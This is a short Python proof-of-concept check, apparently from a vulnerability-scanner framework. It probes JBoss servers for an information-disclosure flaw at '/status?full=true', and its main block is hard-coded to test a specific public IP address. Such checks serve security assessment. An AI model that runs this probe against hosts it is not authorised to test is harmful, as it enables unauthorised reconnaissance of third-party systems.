#-*- coding: utf-8 -*-

import re
from exp.lib.httpparse import httpparse

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if jboss information disclose vul')
    http = httpparse()
    tag = 'Max processing time'
    try:
        tm = http.httpreq('GET', protocol, ip, port, '/status?full=true')
        if (re.search(tag,str(tm[2]),re.I)) and tm[0] == 200 and (re.search('JBoss',str(tm[1]),re.I)):
            msg = 'There is jboss information disclose vul on url: ' +url+ '/status?full=true.'
            number = 'v91'
            return True,url,number,msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no jboss information disclose vul'
    number = 'v0'
    return False,url,number,msg

if __name__ == '__main__':
    res = verify('http','223.202.25.77',80)
    print(res)